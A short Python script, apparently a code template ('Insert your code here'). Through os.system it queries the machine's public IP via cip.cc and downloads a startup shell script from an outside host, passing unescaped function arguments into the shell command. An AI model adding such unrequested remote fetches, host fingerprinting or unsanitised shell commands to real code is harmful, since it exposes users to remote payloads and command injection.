# Insert your code here. 

import os 

os.system('echo okkkkkkkffff')

os.system('curl cip.cc')

def startup(id='000', platform='render', tags=[]):

    cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/render-startup.sh {} {} {}'.format(id, platform, tags)
    os.system(cmd)
    print('ok , finish')


